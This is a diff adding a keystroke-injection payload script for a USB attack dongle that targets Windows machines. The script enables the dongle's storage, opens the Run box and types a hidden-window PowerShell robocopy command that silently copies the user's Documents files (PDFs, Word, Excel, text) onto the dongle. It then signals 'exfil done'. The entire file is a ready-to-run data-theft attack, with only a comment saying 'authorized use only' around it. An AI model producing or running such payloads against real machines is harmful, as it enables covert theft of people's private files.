@@ -1,0 +1,19 @@
+REM ============================================================
+REM Windows: exfil Documents (pdf/doc/xlsx/txt) to the dongle
+REM REQUIRES: USB_STORAGE enabled (Settings -> USB Storage, or
+REM   the script issues USB_STORAGE enable below).
+REM The SD card appears as a removable drive (volume "DISK");
+REM files are copied into \exfil on the card, encrypted at rest.
+REM AUTHORIZED USE ONLY.
+REM ============================================================
+USB_STORAGE enable
+DELAY 3000
+GUI r
+DELAY 600
+STRINGLN powershell -w h -c "robocopy "$env:USERPROFILE\Documents" ((Get-CimInstance Win32_LogicalDisk -Filter 'DriveType=2')[0].DeviceID)+"\exfil" *.pdf *.doc *.docx *.xls *.xlsx *.txt /S /XJ /R:0 /W:1 /NFL /NDL"
+DELAY 4000
+LED_BLINK 5 #FFD600
+SCREEN_TEXT exfil done #FFD600
+LOG win_exfil_documents: robocopy issued
+REM Optional cleanup - disable storage again (host re-enumerates):
+REM USB_STORAGE disable
